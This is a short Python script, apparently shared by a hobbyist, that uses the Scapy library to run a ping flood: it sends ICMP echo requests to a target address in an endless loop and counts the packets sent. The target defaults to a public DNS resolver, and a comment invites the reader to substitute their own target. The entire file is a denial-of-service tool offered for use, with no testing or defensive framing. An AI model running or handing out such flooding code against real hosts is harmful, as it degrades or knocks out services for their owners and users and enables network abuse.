from scapy.all import IP, ICMP, send
import random
import time
# Written by Lithiokride

# Target IP
target_ip = "8.8.8.8"  # Replace with the target IP

# Function to create and send ICMP Echo Requests
def ping_flood(target_ip):
    packet_count = 0  # Initialize packet counter
    
    try:
        # Send ICMP Echo Requests in a loop
        while True:
            # Create IP layer
            ip = IP(dst=target_ip)

            # Create ICMP Echo Request
            icmp = ICMP()

            # Create and send the packet
            packet = ip / icmp
            send(packet, verbose=0)
            packet_count += 1  # Increment the packet counter
            
            # Print packet count every 100 packets
            if packet_count % 100 == 0:
                print(f"Packets sent: {packet_count}")

    except KeyboardInterrupt:
        print(f"\nStopped. Total packets sent: {packet_count}")

# Start the Ping Flood
ping_flood(target_ip)
